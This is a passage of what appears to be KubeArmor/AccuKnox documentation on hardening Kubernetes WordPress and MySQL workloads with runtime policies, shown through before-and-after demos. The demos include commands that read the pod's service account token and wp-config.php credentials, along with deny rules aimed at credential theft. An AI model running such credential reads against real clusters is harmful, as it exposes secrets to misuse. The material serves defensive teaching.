<p>NOTE 03: Above 2 commands will be common for all use cases, keep this open in separate terminals (right section of screenshot)</p> <p>Executing inside MySQL pod: After applying policy <pre><code>kubectl exec -it mysql-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash\nroot@mysql-58cdf6ccf-kzbp8:/# touch /var/lib/mysql/test-2\n</code></pre> </p> Use-case 2: Block access to files containing sensitive data <p>WordPress pod contains a file <code>wp-config.php</code> that has sensitive auth credentials. This use-case is to Block access to this file from unknown processes.</p> <p>Executing inside WordPress pod: Before applying policy <pre><code>kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash\nroot@wordpress-bf95888cb-2kx65:/var/www/html# cat /var/www/html/wp-config.php\n</code></pre></p> <p></p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-wordpress-block-config\n  namespace: wordpress-mysql\nspec:\n  severity: 10\n  selector:\n    matchLabels:\n      app: wordpress\n  file:\n    matchPaths:\n      - path: /var/www/html/wp-config.php\n        fromSource:\n          - path: /bin/cat\n  action: Block\n</code></pre> <p>Applying Policy: Applying above policy to deployed application <pre><code>kubectl apply -f ksp-wordpress-block-config.yaml\n</code></pre></p> <p>Executing inside WordPress pod: After applying policy <pre><code>kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash\nroot@wordpress-bf95888cb-2kx65:/var/www/html# cat /var/www/html/wp-config.php\ncat: /var/www/html/wp-config.php: Permission denied\n</code></pre></p> <p></p> Use-case 3: Block access to K8s service account token <p>A pod is the primary execution unit in K8s. One problem with this approach is that all the processes within that pod have unrestricted access to the pod's volume mounts. One such volume mount is a service account token. Thus, accessing a service account token using an injected binary is a common attack pattern in K8s. This use-case explains how you can protect access (Block) to the service account token through known processes only.</p> <p>Executing inside WordPress pod: Before applying policy <pre><code>kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash\nroot@wordpress-bf95888cb-2kx65:/var/www/html# cat /run/secrets/kubernetes.io/serviceaccount/token\n</code></pre></p> <p></p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-wordpress-block-sa\n  namespace: wordpress-mysql\nspec:\n  severity: 7\n  selector:\n    matchLabels:\n      app: wordpress\n  file:\n    matchDirectories:\n      - dir: /run/secrets/kubernetes.io/serviceaccount/\n        recursive: true\n  action: Block\n</code></pre> <p>Applying Policy: Applying above policy to deployed application <pre><code>kubectl apply -f ksp-wordpress-block-sa.yaml\n</code></pre></p> <p>Executing inside WordPress pod: After applying policy <pre><code>kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash\nroot@wordpress-bf95888cb-2kx65:/var/www/html# cat /run/secrets/kubernetes.io/serviceaccount/token\ncat: /run/secrets/kubernetes.io/serviceaccount/token: Permission denied\n</code></pre></p> <p></p> Use-case 4: Block execution of unwanted processes <p>A container image might get shipped with binaries that are not supposed to be executed in production environments. For e.g., WordPress contains <code>apt</code>, <code>apt-get</code> binaries that are used for dynamic package management. These should never be used in the production environment since it will create drift (change) in the container contents i.e., introduce new files/binaries that might increase the attack surface. The following policy Block the execution of such processes.</p> <p>Executing inside WordPress pod: Before applying policy <pre><code>kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash\nroot@wordpress-bf95888cb-2kx65:/var/www/html# apt\nroot@wordpress-bf95888cb-2kx65:/var/www/html# apt-get update\n</code></pre></p> <p></p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-wordpress-block-process\n  namespace: wordpress-mysql\nspec:\n  severity: 3\n  selector:\n    matchLabels:\n      app: wordpress\n  process:\n    matchPaths:\n      - path: /usr/bin/apt\n      - path: /usr/bin/apt-get\n  action: Block\n</code></pre> <p>Applying Policy: Applying above policy to deployed application <pre><code>kubectl apply -f ksp-wordpress-block-process.yaml\n</code></pre></p> <p>Executing inside WordPress pod: After applying policy <pre><code>kubectl exec -it wordpress-5679855487-58rfz -n wordpress-mysql \u2013- bash\nroot@wordpress-bf95888cb-2kx65:/var/www/html# apt\nbash: /usr/bin/apt: Permission denied\nroot@wordpress-bf95888cb-2kx65:/var/www/html# apt-get update\nbash: /usr/bin/apt-get: Permission denied\n</code></pre></p> <p></p>"},{"location":"getting-started/open-source/#4-get-recommended-policies","title":"4. Get Recommended Policies","text":"<p>In the above Demo Scenario, we had to explicitly write KubeArmor policies. But with the new KubeArmor recommendation it is easy to get a set of security best practice policies tailored to your environment.</p> karmor recommend --namespace wordpress-mysql --labels app=wordpress <pre><code>INFO[0000] pulling image                                 image=\"wordpress:4.8-apache\"\n4.8-apache: Pulling from library/wordpress\nDigest: sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\nStatus: Image is up to date for wordpress:4.8-apache\nINFO[0015] dumped image to tar                           tar=/tmp/karmor4070582578/GwoIiuRV.tar\nDistribution debian\nINFO[0018] No runtime policy generated for wordpress-mysql/wordpress/wordpress:4.8-apache\ncreated policy out/wordpress-mysql-wordpress/wordpress-4-8-apache-maintenance-tool-access.yaml ...\ncreated policy out/wordpress-mysql-wordpress/wordpress-4-8-apache-cert-access.yaml ...\ncreated policy out/wordpress-mysql-wordpress/wordpress-4-8-apache-system-owner-discovery.yaml ...\ncreated policy out/wordpress-mysql-wordpress/wordpress-4-8-apache-system-monitoring-deny-write-under-bin-directory.yaml ...\ncreated policy out/wordpress-mysql-wordpress/wordpress-4-8-apache-system-monitoring-write-under-dev-directory.yaml ...\ncreated policy out/wordpress-mysql-wordpress/wordpress-4-8-apache-least-functionality-execute-package-management-process-in-container.yaml ...\noutput report in out/report.txt ...\n</code></pre> Using recommended policies <p>The recommended policy <code>xx-xx-cert-access.yaml</code> is a powerful policy which enables read access to trusted certificates but denied any form of write to it. This inturn enables the integrity of the file and denies malware/adware to have Adversary-in-the-Middle capability (Ref MITRE-T1553).</p> <p>Executing inside WordPress pod: Before applying policy <pre><code>kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash\nroot@wordpress-cb9c668d4-zgczt:/var/www/html# cd /etc/ssl/\nroot@wordpress-cb9c668d4-zgczt:/etc/ssl# echo \"new private key\" &gt; myssl.pem\nroot@wordpress-cb9c668d4-zgczt:/etc/ssl# cat myssl.pem\nnew private key\nroot@wordpress-cb9c668d4-zgczt:/etc/ssl#\n</code></pre></p> <p></p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: wordpress-wordpress-4-8-apache-cert-access\nnamespace: wordpress-mysql\nspec:\naction: Block\nfile:\n    matchDirectories:\n    - dir: /etc/ssl/\n    readOnly: true\n    recursive: true\n    - dir: /etc/pki/\n    readOnly: true\n    recursive: true\n    - dir: /usr/local/share/ca-certificates/\n    readOnly: true\n    recursive: true\nmessage: Credentials modification denied\nselector:\n    matchLabels:\n    app: wordpress\nseverity: 1\ntags:\n- MITRE\n- MITRE_T1552_unsecured_credentials\n</code></pre> <p>Applying Policy: Applying above recommended policy to deployed application <pre><code>kubectl apply -f out/wordpress-mysql-wordpress/wordpress-4-8-apache-cert-access.yaml\n</code></pre></p> <p>Executing inside WordPress pod: After applying policy <pre><code>kubectl exec -it wordpress-cb9c668d4-zgczt -n wordpress-mysql \u2013- bash\nroot@wordpress-cb9c668d4-zgczt:/var/www/html# cd /etc/ssl/\nroot@wordpress-cb9c668d4-zgczt:/var/www/html# cat myssl.pem\nnew private key\nroot@wordpress-cb9c668d4-zgczt:/var/www/html# echo \"updated ssl key\" &gt;&gt; myssl.pem\nbash: /etc/ssl/myssl.pem: Permission denied\nroot@wordpress-cb9c668d4-zgczt:/var/www/html#\n</code></pre></p> <p></p>"},{"location":"getting-started/open-source/#5-uninstall","title":"5. Uninstall","text":"<pre><code>karmor uninstall\n\n# If there is no other workloads deployed in accuknox-agents namesapce apart from DE, this can be removed\nkubectl delete ns accuknox-agents\n</code></pre>"},{"location":"getting-started/open-source/#references","title":"References","text":"<ol> <li>AccuKnox Splunk App for Compliance and K8s Events</li> <li>KubeArmor support matrix</li> <li>Integrating KubeArmor with Prometheus and Grafana</li> </ol> <p>SCHEDULE DEMO</p>"},{"location":"getting-started/php-mysql/","title":"PHP MySQL Web Application","text":"<p>Database Management is an important part when you have a large amount of data around you. MySQL is one of the most famous open-source Relational Databases to store and handle your data. So securing the data is the main concern for any organization.</p> <p>AccuKnox  provides runtime cloud security for your applications. In this cookbook, we will demonstrate how MySQL applications can be protected.</p>"},{"location":"getting-started/php-mysql/#prerequisites","title":"Prerequisites","text":"<ol> <li>Kubernetes cluster deployed on any platform. (Local , Azure, Aws, GCP)</li> <li>Cluster onboarded on AccuKnox Saas platform. Follow this onboarding guide</li> </ol>"},{"location":"getting-started/php-mysql/#deploy-sample-phpmysql-web-application-in-kubernetes","title":"Deploy Sample PHP/MySQL Web application in Kubernetes","text":"<p>We will create two deployments; one for the webserver and the other for MySQL DB. The web server will read data from MySQL DB and show it in the browser.</p> <p>Here we have used the GKE environment.</p> <p>[Step 1] Deploy Web server</p> <pre><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/php-mysql-webapp/webserver.yaml\n</code></pre> <p>Run <code>kubectl get pods</code> in the terminal to get the response:</p> <p>You should be able to see the output like this:</p> <pre><code>NAME                         READY   STATUS    RESTARTS   AGE\nwebserver-55f99f9ffb-f4rvk   1/1     Running   0          2d3h\n</code></pre> <p>Alright, the pod is created but we can\u2019t access it despite having its IP, the reason is that the Pod IP is not public. So we use  service. When a user tries to access an app, for instance, a web server here, it actually makes a request to a service which itself then checks where it should forward the request. Now to access the webserver you will just access the IP and port as defined in the service configuration file.</p> <p>[Step 2] Now let's deploy web-service</p> <pre><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/php-mysql-webapp/webserver-svc.yaml\n</code></pre> <p>[Step 3] Check the status of the service</p> <pre><code>kubectl get svc\n</code></pre> <p>You should be able to see the output like this</p> <pre><code>NAME             TYPE           CLUSTER-IP     EXTERNAL-IP      PORT(S)        AGE\nkubernetes       ClusterIP      10.16.0.1      &lt;none&gt;           443/TCP        27d\nweb-service      LoadBalancer   10.16.9.151    35.193.121.214   80:31533/TCP   2d3h\n</code></pre> <p>[Step 4] Create persistent volume and persistent volume claim to keep your data intact.</p> <p>Create a directory where the Volume will be stored</p> <pre><code>sudo mkdir /mnt/data\n</code></pre> <p>Create a yaml file with following Data and save it as pv.yaml</p> <p><pre><code>apiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: task-pv-volume\n  labels:\n    type: local\nspec:\n  storageClassName: manual\n  capacity:\n    storage: 10Gi\n  accessModes:\n    - ReadWriteOnce\n  hostPath:\n    path: \"/mnt/data\"\n</code></pre> Deploy the Persistent Volume and Persistent Volume Claim</p> <pre><code>kubectl apply -f pv.yaml\nkubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/php-mysql-webapp/mysql-pv-claim.yaml\n</code></pre> <p>[Step 5] Create deployment and service for MySQL DB.</p> <pre><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/php-mysql-webapp/mysql.yaml\nkubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/php-mysql-webapp/mysql-svc.yaml\n</code></pre> <p>Check the status of the pod and service</p> <pre><code>kubectl get po,svc\n</code></pre> <p>You should be able to see the output like this</p> <pre><code>NAME                             READY   STATUS    RESTARTS   AGE\npod/mysql-796674bfb-dl495        1/1     Running   0          115s\npod/webserver-5f7dbd89d6-5ng7r   1/1     Running   0          19m\npod/webserver-5f7dbd89d6-hnrz9   1/1     Running   0          19m\npod/webserver-5f7dbd89d6-pmw4s   1/1     Running   0          19m\n\nNAME                     TYPE           CLUSTER-IP   EXTERNAL-IP    PORT(S)        AGE\nservice/kubernetes       ClusterIP      10.8.0.1     &lt;none&gt;         443/TCP        32m\nservice/mysql8-service   ClusterIP      10.8.1.249   &lt;none&gt;         3306/TCP       27s\nservice/web-service      LoadBalancer   10.8.0.92    34.70.234.72   80:32209/TCP   14m\n</code></pre> <p>Now the application is deployed. You can insert data into the database in two ways. You can use a MySQL Client or directly execute to the MySQL server pod.</p> <p>Connect using a MySQL client</p> <pre><code>kubectl run -it --rm --image=mysql:5.6 --restart=Never mysql-client -- mysql -h mysql8-service -p.sweetpwd.\n</code></pre> <p>You should be able to see the output like this</p> <pre><code>$ kubectl run -it --rm --image=mysql:5.6 --restart=Never mysql-client -- mysql -h mysql8-service -p.sweetpwd.\nIf you don't see a command prompt, try pressing enter.\n\nmysql&gt;\n</code></pre> <p>Directly executing into MySQL pod:</p> <pre><code>kubectl exec -it mysql-796674bfb-dl495 -- bash\n</code></pre> <p>Note: Replace mysql-796674bfb-dl495 with your mysql pod name.</p> <p>Now you are inside MySQL pod. Use the below command to enter the MySQL command prompt.</p> <pre><code>mysql -u root -p.sweetpwd.\n</code></pre> <p>You should be able to see the output like this</p> <pre><code>$ kubectl exec -it mysql-69559dfd5d-nzmcd -- bash\nroot@mysql-69559dfd5d-nzmcd:/# mysql -u root -p.sweetpwd.\nmysql: [Warning] Using a password on the command line interface can be insecure.\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 10\nServer version: 8.0.28 MySQL Community Server - GPL\n\nCopyright (c) 2000, 2022, Oracle and/or its affiliates.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql&gt;\n</code></pre> <p>Now you are inside the MySQL terminal. First, you need to create a users table and add values to the table.</p> <p>Use the below commands to do that.</p> <pre><code>SHOW DATABASES;\n</code></pre> <p>You should be able to see the output like this</p> <pre><code>USE my_db;\n</code></pre> <p>You should be able to see the output like this</p> <pre><code>CREATE TABLE users\n(\nname varchar(20)\n);\n</code></pre> <p>You should be able to see the output like this</p> <p><pre><code>INSERT INTO users (name)\nVALUES ('John');\n</code></pre> </p> <p>Now check the external IP of the web service. If everything works well, you'll see this screen with the name John.</p> <p></p>"},{"location":"getting-started/php-mysql/#working-with-open-source-accuknox-tools","title":"Working with Open-Source AccuKnox tools","text":"<p>The policy-templates open-source repository provides policy templates based on KubeArmor and Cilium policies for known CVEs and attacks vectors, compliance frameworks such as PCI-DSS, MITRE, STIG, NIST, CIS, etc., popular workloads such as GoLang, Python, PostgreSQL, Cassandra, MySQL, WordPress, etc.</p> <p>We hope that you also contribute by sending policy templates via pull requests or Github issues to grow the list.</p> <p>See Polciy Templates. AccuKnox provides a number of policy templates for your MySQL workloads.</p> <p>Let's see a policy from the policy templates repo.</p>"},{"location":"getting-started/php-mysql/#audit-your-mysql-server-sensitive-configuration-files-with-kubearmor","title":"Audit your MySQL Server Sensitive Configuration files with KubeArmor","text":"<p>MySQL Server, also known as mysqld, is a single multithreaded program that does most of the work in a MySQL installation. It does not spawn additional processes. MySQL Server manages access to the MySQL data directory that contains databases and tables. The data directory is also the default location for other information such as log files and status files.</p>"},{"location":"getting-started/php-mysql/#i-mycnf","title":"(i) my.cnf:","text":"<p>The default configuration file is called  my.cnf  and can be located in a number of directories. On Linux and other Unix related platforms, the locations are using  /etc/my.cnf, /etc/mysql/my.cnf, /var/lib/mysql/my.cnf or in the default installation directory. This file contains configuration settings that will be loaded when the server starts, including settings for the clients, server, mysqld_safe wrapper and various other MySQL client programs.</p> <p>However, if they're not there, you can use mysqld to find the configuration. Run the following command inside the MySQL server pod.</p> <pre><code>mysqld --help --verbose\n</code></pre> <p>The first part of the lengthy response describes the options you can send to the server when you launch it. The second part displays the configuration settings during the server compilation.</p> <p>Near the start of the output, find a couple of lines that look similar to the following example:</p> <pre><code>Starts the MySQL database server.\n\nUsage: mysqld [OPTIONS]\n\nDefault options are read from the following files in the given order:\n/etc/my.cnf /etc/mysql/my.cnf ~/.my.cnf\nThe following groups are read: mysqld server mysqld-8.0\n</code></pre>"},{"location":"getting-started/php-mysql/#ii-my-newcnf","title":"(ii) my-new.cnf","text":"<p>This file is created when there is an existing my.cnf file and the  mysql_install_db  script is running. The mysql_install_db script is designed to develop the my.cnf file if it does not exist. If the file does exist, then the file is created using the name my-new.cnf to avoid overwriting an existing configuration file. It is then up to the user to compare the two, determine files and determine which options are still valid, for the new install and change the files as required to get the new my.cnf configuration file.</p>"},{"location":"getting-started/php-mysql/#iii-log-files","title":"(iii) Log files","text":"<p>By default, MySQL stores its log files in the following directory:</p> <pre><code>/var/log/mysql\n</code></pre> <p>Check the MySQL configuration if you don't find the MySQL logs in the default directory. View the  my.cnf  file and look for a log_error line, as in:</p> <pre><code>log_error = /var/log/mysql/error.log\n</code></pre>"},{"location":"getting-started/php-mysql/#iv-backups","title":"(iv) Backups","text":"<p>The two main options are to copy the database files or use  mysqldump as follows:</p>"},{"location":"getting-started/php-mysql/#file-copy","title":"File copy","text":"<p>By default, MySQL creates a directory for each database in its data directory,  /var/lib/mysql.</p> <p>Note: Ensure you set the permissions on that file to restrict read access for password-security reasons.</p>"},{"location":"getting-started/php-mysql/#mysqldump","title":"mysqldump","text":"<p>Another approach to backing up your database is to use the mysqldump tool. Rather than copying the database files directly, mysqldump generates a text file that represents the database. By default, the text file contains a list of SQL statements to recreate the database, but you can also export the database in another format like  .CSV  or  .XML. You can read the man page for mysqldump to see all its options.</p> <p>The statements generated by mysqldump go straight to standard output. You can specify a to redirect the output by running the following command in the command line:</p> <p>This command tells mysqldump to recreate the  demodb  database in SQL statements and to write them to the file  dbbackup.sql. Note that the username and password options function the same as the MySQL client to include the password directly after -p in a script.</p> <p>With the help of  KubeArmor  and Policy-templates, You can audit/restrict all these sensitive configuration files and processes that use these files easily.</p>"},{"location":"getting-started/php-mysql/#policy-to-audit-configuration-files-and-block-mysqldump","title":"Policy to Audit configuration files and block mysqldump","text":"<pre><code># KubeArmor is an open source software that enables you to protect your cloud workload at runtime.\n# To learn more about KubeArmor visit:\n# https://www.accuknox.com/kubearmor/\n\napiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-restrict-access-mysql-server-config\n  namespace: default # Change your namespace\nspec:\n  tags: [\"MYSQL\", \"config-files\", \"mysqldump\"]\n  message: \"Alert! mysql configuration files has been accessed and/or mysqldump command is has been used.\"\n  selector:\n    matchLabels:\n      app: mysql8 # Change your labels\n  file:\n    severity: 5\n    matchPaths:\n    - path: /etc/mysql/my.cnf\n      ownerOnly: true\n    matchDirectories:\n    - dir: /etc/mysql/\n      recursive: true\n      ownerOnly: true\n    - dir: /var/lib/mysql/\n      readOnly: true\n      recursive: true\n    - dir: /var/log/mysql/\n      recursive: true\n    action: Audit\n  process:\n    severity: 10\n    matchPaths:\n    - path: /usr/bin/mysqldump\n    action: Block\n</code></pre> <p>Apply KubeArmor Security Policy (KSP) from the  Policy templates  and perform following steps:</p> <ol> <li> <p>Go to Runtime Protection \u2192 Policies and create a Policy</p> </li> <li> <p>Upload the above yaml file or create the Policy from the user interface.</p> </li> </ol> <p></p> <ol> <li> <p>Save the policy to workspace and apply it.</p> </li> <li> <p>After applying the policy it will go into pending state. Click on the policy and approve it to activate the policy.</p> </li> </ol> <p></p> <ol> <li>Inside your cluster you should be able to see the policy as kubernetes object.</li> </ol> <p></p> <ol> <li>Use mysqldump command:</li> </ol> <pre><code>kubectl exec -it mysql-69559dfd5d-nzmcd -- bash\nroot@mysql-7d9977c67d-57mrx:/# mysqldump -u db_user -p .mypwd my_db users &gt; dumpfilename.sql\n</code></pre> <p>Note: Replace mysql-69559dfd5d-nzmcd with your mysql pod name.</p> <ul> <li>You should be able to see the output like this</li> </ul> <p></p>"},{"location":"getting-started/php-mysql/#view-logs","title":"View logs:","text":"<p>a. Observing logs using karmor CLI</p> <pre><code>karmor log\n</code></pre> <p>You should be able to see the output like this</p> <pre><code>== Alert / 2023-03-22 06:40:00.241489 ==\nClusterName: default\nHostName: master\nNamespaceName: default\nPodName: mysql-d5f479b99-8fqp2\nLabels: app=mysql8\nContainerName: mysql\nContainerID: 5699c5be4586a4abf1bf17ebad872935738bbd498a06ffb800ea65462f7312db\nContainerImage: docker.io/library/mysql:8.0@sha256:2596158f73606ba571e1af29a9c32bec5dc021a2495e4a70d194a9b49664f4d9\nType: MatchedPolicy\nPolicyName: ksp-restrict-access-mysql-server-config\nSeverity: 10\nSource: /usr/bin/bash\nResource: /usr/bin/mysqldump -u db_user -p .mypwd my_db users\nOperation: Process\nAction: Block\nData: syscall=SYS_EXECVE\nEnforcer: AppArmor\nResult: Permission denied\nATags: [MySQL config-files mysqldump]\nHostPID: 8792\nHostPPID: 8595\nPID: 137\nPPID: 129\nParentProcessName: /usr/bin/bash\nProcessName: /usr/bin/mysqldump\nTags: MySQL,config-files,mysqldump\n</code></pre> <p>Accessing /etc/mysql/my.cnf config. file;</p> <pre><code>root@mysql-7d9977c67d-7rcmb:/# cat /etc/mysql/my.cnf\n</code></pre> <p>KubeArmor detects this event and you will receive logs like this: Check karmor log</p> <p><pre><code>== Alert / 2022-02-08 03:12:40.413064 ==\nCluster Name: default\nHost Name: gke-cys-feb8-default-pool-4852bc33-rmcr\nNamespace Name: default\nPod Name: mysql-69559dfd5d-nzmcd\nContainer ID: 4dd61ec15b1f8075b8ac9ebe2aeed413c01e57af7d4e9bec7cff82b65f761677\nContainer Name: mysql\nSeverity: ksp-restrict-access-mysql-server-config\nTags: 5\nMessage: MYSQL,config-files,mysqldump\nType: Alert! mysql configuration files has been accessed and/or mysqldump command is has been used.\nSource: MatchedPolicy\nOperation: /bin/cat /etc/mysql/my.cnf\nResource: File\nData: /etc/mysql/my.cnf\nAction: syscall=SYS_OPENAT fd=-100 flags=/etc/mysql/my.cnf\nResult: Audit\n</code></pre> b. You can easily watch these alerts at AccuKnox Saas \u2192 Monitors/Logging \u2192 logs</p> <p></p> <p>Securing configuration files are a necessity for any application. With KubeArmor you can effectively do that and with the options like readOnly , ownerOnly , recursive, matchDirectoriesetc you can fine-tune the policy enforcement. See more KubeArmor Policy Specification</p>"},{"location":"getting-started/php-mysql/#protect-using-auto-discovered-policies","title":"Protect Using Auto Discovered Policies","text":"<p>AccuKnox policy auto-discovery engine leverages the pod visibility provided by KubeArmor and Kubernetes CNI to auto-generate network and system policies.</p> <p>CWPP Dashboard \u2192 Policies \u2192 Discovered</p> <p>We deployed our sample application on the default namespace. Check default namespace for policies</p> <p></p> <p>Following are the auto-discovered policies generated by  AccuKnox. Let's briefly explain the policies.</p> <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: autopol-ingress-dzfzevuxgslgfyt\n  namespace: default\nspec:\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          app: apache\n    ports:\n    - port: 3306\n      protocol: TCP\n  podSelector:\n    matchLabels:\n      app: mysql8\n  policyTypes:\n  - Ingress\n</code></pre> <p>This policy will be enforced at the ingress (against the inbound network flows) of the MySQL pod (pods labeled with app: mysql8 will be picked).</p> <p>This enables endpoints with the label app: apache and k8s:io.kubernetes.pod.namespace: default to communicate with all endpoints with the label app: mysql8, but they must share using TCP on port 3306.</p> <p>Endpoints with other labels will not communicate with the MySQL pod.</p> <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: autopol-egress-tqrnwwewtbyqduf\n  namespace: default\nspec:\n  egress:\n  - ports:\n    - protocol: UDP\n  podSelector:\n    matchLabels:\n      app: apache\n  policyTypes:\n  - Egress\n</code></pre> <p>This policy is very similar to the first policy. This will be enforced at the webserver pod's egress (against the outbound network flows) (pods labelled with the app: apache will be picked).</p> <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: autopol-ingress-jcicjwdjyptozzw\n  namespace: default\nspec:\n  ingress:\n  - ports:\n    - port: 80\n      protocol: TCP\n  podSelector:\n    matchLabels:\n      app: apache\n  policyTypes:\n  - Ingress\n</code></pre> <p>All these policies are generated based on the network flow of the sample application.</p> <p>It is allowing only minimum traffic that the application needed to operate. This will restrict all unwanted connections and reduce the application's attack surface.</p>"},{"location":"getting-started/php-mysql/#conclusion","title":"Conclusion","text":"<p>Auto-discovered policies are generated based on the network flow of the application.</p> <p>It is allowing only minimum traffic that the application needed to operate. This will restrict all unwanted connections and provide runtime security. You can also handcraft your own security policies to secure your MySQL cluster.</p> <p>Now you can protect your workloads in minutes using  AccuKnox, it is available to protect your Kubernetes and other cloud workloads using Kernel Native Primitives such as AppArmor, SELinux, and eBPF.</p> <p>Let us know  if you are seeking additional guidance in planning your cloud security program.</p> <p>SCHEDULE DEMO</p>"},{"location":"getting-started/security-on-openshift/","title":"Runtime Security Deployment for Openshift","text":""},{"location":"getting-started/security-on-openshift/#operator-installation","title":"Operator Installation","text":"<p>In the OpenShift console, install KubeArmor operator by following the instructions below:</p> <ul> <li>Under operators (1) select Operator Hub (2).</li> <li>Search for the word \"kubearmor\" (3) and select \"KubeArmor Operator\" (4).</li> <li>Install KubeArmor version \"1.4.9\" with default configurations (5, 6, 7).</li> </ul>"},{"location":"getting-started/security-on-openshift/#elasticsearch-integration","title":"ElasticSearch Integration","text":"<p>To integrate KubeArmor with Elasticsearch, the following inputs are required:</p> <ul> <li>Username/Password: If the Elasticsearch server requires authentication.</li> <li>CA Certificate: If Elasticsearch security is enabled.</li> <li>URL of Elasticsearch: Including protocol and port.</li> </ul>"},{"location":"getting-started/security-on-openshift/#steps-to-install","title":"Steps to Install","text":""},{"location":"getting-started/security-on-openshift/#usernamepassword-installation","title":"Username/Password Installation","text":"<p>If the server does not require authentication, you can skip this step. To use username/password authentication with Elasticsearch, a Kubernetes secret called <code>elastic-secret</code> needs to be created in the <code>kubearmor</code> namespace.</p> <p>Run the following command, replacing <code>&lt;elastic-user&gt;</code> and <code>&lt;elastic-password&gt;</code> with appropriate values:</p> <pre><code>kubectl create secret generic elastic-secret -n kubearmor --from-literal username=&lt;elastic-user&gt; --from-literal password=&lt;elastic-password&gt;\n</code></pre>"},{"location":"getting-started/security-on-openshift/#ca-certificate-installation","title":"CA Certificate Installation","text":"<p>To use HTTPS communication between the agents and Elasticsearch, a Kubernetes secret called <code>elastic-ca</code> needs to be created in the <code>kubearmor</code> namespace.</p> <ul> <li>Acquire the CA certificate used by Elasticsearch. If acquiring the certificate is not possible, set the <code>allowInsecureTLS</code> flag to <code>true</code> in the next steps.</li> <li>Save the certificate in a file and run the following command:</li> </ul> <pre><code>kubectl create secret generic elastic-ca -n kubearmor --from-file ca.crt=&lt;cacert file name&gt;\n</code></pre>"},{"location":"getting-started/security-on-openshift/#kubearmor-instance-installation","title":"KubeArmor Instance Installation","text":"<p>Once the steps in the previous chapter are completed, proceed with the agent installation from the OpenShift console.</p>"},{"location":"getting-started/security-on-openshift/#steps-to-install_1","title":"Steps to Install","text":"<ol> <li>Install the required SCC using the following command:</li> </ol> <pre><code>oc create -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/pkg/KubeArmorOperator/config/rbac/kubearmor-scc.yaml\n</code></pre> <ol> <li>In the OpenShift console:</li> <li>Under Operators (1), go to Installed Operators (2).</li> <li>Select <code>kubearmor</code> (3) as the project.</li> <li>Click on the KubeArmor Operator (4).</li> <li> <p>Create a <code>KubeArmorConfig</code> Instance (5).</p> </li> <li> <p>In the form view:</p> </li> <li>Select Adapters (6) -&gt; Elasticsearch Adapter (7).</li> <li> <p>Perform the following steps:</p> <ul> <li>Enter the Elasticsearch URL in the field (8).</li> <li>Enable Elasticsearch adapter by checking the checkbox (9).</li> <li>Click on Elasticsearch Authentication (10) and:</li> <li>Set the CA secret field (11) to <code>elastic-ca</code>.</li> <li>To enable insecure TLS communication (if no certificate is available), check the <code>allowInsecureTLS</code> checkbox (11-b) and leave the field (11) empty.</li> </ul> </li> <li> <p>Create the instance. The <code>KubeArmorConfig</code> Instance controls the installation of the agents in the entire cluster, and only one instance should be created per cluster.</p> </li> </ol>"},{"location":"getting-started/security-on-openshift/#kibana-dashboard-setup","title":"Kibana Dashboard Setup","text":""},{"location":"getting-started/security-on-openshift/#steps-to-install_2","title":"Steps to Install","text":"<p>Along with this document, a file called <code>kubearmor-dashboard.ndjson</code> has been shared. Follow these steps to import the dashboard:</p> <ol> <li>Under the Management tab, select Stack Management.</li> <li>Navigate to Saved Objects under Kibana.</li> <li>Click Import and select <code>kubearmor-dashboard.ndjson</code>.</li> </ol> <p></p> <p></p> <p></p>"},{"location":"getting-started/wordpress-mysql/","title":"WordPress-MySQL Application","text":"<p>WordPress-MySQL Application has the WordPress front end connecting to the MySQL backend. When this application is deployed in the k8s environment, we have two pods one for WordPress and another for Mysql. We can onboard the cluster to our AccuKnox SaaS by following the steps here.</p>"},{"location":"getting-started/wordpress-mysql/#observability","title":"Observability","text":"<p>Once the cluster with the WordPress-MySQL application is onboarded we can see the application behavior by Navigating to the Runtime Security\u2192App Behavior section. In the screen the select cluster name and namespace in which the WordPress-MySQL application is deployed.</p> <p>1.Network Observability</p> <p>Here we can get the details of the ingress and egress connections that are happening in the pod. </p> <p>2.File observability</p> <p>In file observability, the information related to the files that are being accessed in the pod will be shown </p> <p>3.Process Observability</p> <p>In process observability, the information related to the process that is being executed in the pod will be shown.</p> <p></p>"},{"location":"getting-started/wordpress-mysql/#preventing-wordpress-from-remote-code-execution","title":"Preventing WordPress from Remote-code execution","text":"<p>Based on the application behavior currently, in the WordPress pod, the attacker can easily get access to the bash and execute his remote code using the package management tools. The attacker can leverage this vulnerability to execute his code or download any binary into the pod.</p> <p></p> <p>we can protect this with help of hardening policies that kubearmor has discovered based on the application behavior of this WordPress-mysql application. To see and apply this hardening policy follow the below steps:</p> <p>Step 1:  